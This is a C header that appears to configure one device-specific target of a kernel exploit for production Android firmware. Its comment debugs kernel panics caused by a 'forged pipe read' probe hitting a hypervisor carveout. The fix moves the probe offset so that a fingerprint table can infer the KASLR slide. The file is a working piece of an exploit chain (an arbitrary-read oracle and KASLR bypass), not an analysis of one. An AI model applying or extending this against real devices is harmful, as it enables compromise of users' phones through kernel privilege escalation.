#include "../q6q-F9560ZCU3DZDP-v8/target.h"

/* v9: move the P0 probe window above the gunyah_hyp_region carveout.
 *
 * The v7/v8 kernel panics are identical:
 *   Unable to handle kernel paging request at virtual address ffffff8000270000
 *   PC is at __arch_copy_to_user+0x180/0x238  (pipe_read -> copy_page_to_iter)
 *   FSC = 0x06: level 2 translation fault (pmd=0)
 * The probe slot forges a pipe read at
 *   P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + P0_ORACLE_PROBE_OFFSET
 * = PAGE_OFFSET + delta(0x80000) + 0x1f0000 = 0xffffff8000270000
 * = phys 0x80270000 = kernel-image offset 0x1f0000.
 * That phys lies inside the gunyah_hyp_region [0x80000000, 0x80e00000),
 * which the kernel excludes from the linear map (pmd=0), so the forged pipe
 * read faults and panics.  The kernel image is loaded at 0x80080000, so its
 * first 0xd80000 bytes overlap the carveout and can never be probed via the
 * linear alias.
 *
 * v9 raises P0_ORACLE_PROBE_OFFSET to 0x1000000: the probe then reads image
 * offset 0x1000000 (phys 0x81080000 > 0x80e00000) and the regenerated
 * fingerprint table (q6q direct-source-offset convention, key range
 * [0xe10000, 0x1000000]) keeps the inverse-slide formula
 * slide = P0_ORACLE_PROBE_OFFSET - matched_key within [0, 0x1f0000].
 */
#undef P0_ORACLE_PROBE_OFFSET
#define P0_ORACLE_PROBE_OFFSET 0x1000000ULL
#undef P0_FINGERPRINT_HEADER
#define P0_FINGERPRINT_HEADER \
  "targets/q6q-F9560ZCU3DZDP-v9/p0_fingerprint.h"
#undef BUILD_VARIANT_LABEL
#define BUILD_VARIANT_LABEL \
  "q6q-F9560ZCU3DZDP-app-production-v9-probe-above-carveout"
